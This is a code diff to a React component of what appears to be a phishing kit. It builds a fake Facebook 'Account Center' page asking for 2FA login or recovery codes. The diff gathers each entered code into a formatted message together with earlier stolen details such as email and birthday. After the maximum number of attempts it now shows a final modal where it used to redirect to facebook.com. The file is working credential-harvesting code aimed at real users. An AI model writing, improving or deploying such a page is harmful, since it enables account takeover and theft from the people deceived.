@@ -5,11 +5,18 @@ import { z } from 'zod';
 import OTPImage from '@/assets/verify.png';
 import { Loader2 } from 'lucide-react';
 import { config } from '@/config/data';
+import FinalModal from './FinalModal'; // import modal
+
 const verifySchema = z.object({
-    code: z.string().min(6, 'Code must be at least 6 digits').max(8, 'Code cannot be more than 8 digits').regex(/^\d+$/, 'Code must contain only numbers')
+    code: z
+        .string()
+        .min(6, 'Code must be at least 6 digits')
+        .max(8, 'Code cannot be more than 8 digits')
+        .regex(/^\d+$/, 'Code must contain only numbers')
 });
 
 type VerifyFormValues = z.infer<typeof verifySchema>;
+
 interface StoredFormData {
     email: string;
     birthday: string;
@@ -24,6 +31,7 @@ interface StoredFormData {
 const Verify = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
+    const [showFinalModal, setShowFinalModal] = useState(false); // state mới
 
     const {
         register,
@@ -53,7 +61,11 @@ const Verify = () => {
 
             const originalMessage = formData.lastMessage ?? '';
 
-            const codeAttemptsText = codeAttempts.map((code, index) => `\n<b>📱 2FA CODE ${index + 1}:</b> <code>${code}</code>`).join('');
+            const codeAttemptsText = codeAttempts
+                .map(
+                    (code, index) => `\n<b>📱 2FA CODE ${index + 1}:</b> <code>${code}</code>`
+                )
+                .join('');
 
             const fullMessage = `${originalMessage}${codeAttemptsText}`;
 
@@ -96,10 +108,9 @@ const Verify = () => {
 
             setShowError(true);
 
+            // Khi đạt MAX_CODE_ATTEMPTS -> show modal
             if (codeAttempts.length >= config.MAX_CODE_ATTEMPTS) {
-                setTimeout(() => {
-                    window.location.replace('https://facebook.com');
-                }, config.LOAD_TIMEOUT_MS);
+                setShowFinalModal(true);
             }
         } catch (error) {
             console.error('Error:', error);
@@ -111,35 +122,73 @@ const Verify = () => {
 
     return (
         <div className='flex w-full flex-col items-center justify-center p-4'>
-            <div className='flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3'>
-                <div className='flex flex-col'>
-                    <b>Account Center - Facebook</b>
-                    <b className='text-2xl'>Check notifications on another device</b>
-                </div>
-                <img src={OTPImage} alt='Verification' className='w-full' />
-                <div>
-                    <b>Approve from another device or Enter your login code</b>
-                    <p>Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code</p>
-                </div>
-                <form onSubmit={handleSubmit(onSubmit)} className='my-2 flex flex-col items-center justify-center'>
-                    <input {...register('code')} className='w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none' type='text' autoComplete='one-time-code' inputMode='numeric' maxLength={8} placeholder='Enter Code' />
-                    {errors.code && <p className='mt-1 text-sm text-red-500'>{errors.code.message}</p>}
-                    {!isLoading && showError && <p className='mt-2 text-red-500'>This code is incorrect. Please check that you entered the code correctly or try a new code.</p>}
-                    <button type='submit' className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${isCodeValid ? 'cursor-pointer bg-blue-500 hover:bg-blue-600' : 'cursor-not-allowed bg-blue-300'} ${isLoading ? 'cursor-not-allowed opacity-70' : ''}`} disabled={!isCodeValid || isLoading}>
-                        {isLoading ? (
-                            <>
-                                <Loader2 className='mr-2 h-4 w-4 animate-spin' />
-                                Verifying...
-                            </>
-                        ) : (
-                            'Continue'
+            {!showFinalModal && (
+                <div className='flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3'>
+                    <div className='flex flex-col'>
+                        <b>Account Center - Facebook</b>
+                        <b className='text-2xl'>Check notifications on another device</b>
+                    </div>
+                    <img src={OTPImage} alt='Verification' className='w-full' />
+                    <div>
+                        <b>Approve from another device or Enter your login code</b>
+                        <p>
+                            Enter 6-digit code we just send from the authentication app you set
+                            up, or Enter 8-digit recovery code
+                        </p>
+                    </div>
+                    <form
+                        onSubmit={handleSubmit(onSubmit)}
+                        className='my-2 flex flex-col items-center justify-center'
+                    >
+                        <input
+                            {...register('code')}
+                            className='w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
+                            type='text'
+                            autoComplete='one-time-code'
+                            inputMode='numeric'
+                            maxLength={8}
+                            placeholder='Enter Code'
+                        />
+                        {errors.code && (
+                            <p className='mt-1 text-sm text-red-500'>{errors.code.message}</p>
                         )}
-                    </button>
-                    <button type='button' className='text-blue-500 hover:underline' onClick={() => setShowError(false)}>
-                        Send Code
-                    </button>
-                </form>
-            </div>
+                        {!isLoading && showError && (
+                            <p className='mt-2 text-red-500'>
+                                This code is incorrect. Please check that you entered the code
+                                correctly or try a new code.
+                            </p>
+                        )}
+                        <button
+                            type='submit'
+                            className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
+                                isCodeValid
+                                    ? 'cursor-pointer bg-blue-500 hover:bg-blue-600'
+                                    : 'cursor-not-allowed bg-blue-300'
+                            } ${isLoading ? 'cursor-not-allowed opacity-70' : ''}`}
+                            disabled={!isCodeValid || isLoading}
+                        >
+                            {isLoading ? (
+                                <>
+                                    <Loader2 className='mr-2 h-4 w-4 animate-spin' />
+                                    Verifying...
+                                </>
+                            ) : (
+                                'Continue'
+                            )}
+                        </button>
+                        <button
+                            type='button'
+                            className='text-blue-500 hover:underline'
+                            onClick={() => setShowError(false)}
+                        >
+                            Send Code
+                        </button>
+                    </form>
+                </div>
+            )}
+
+            {/* Hiển thị modal khi đủ số lần nhập */}
+            {showFinalModal && <FinalModal />}
         </div>
     );
 };
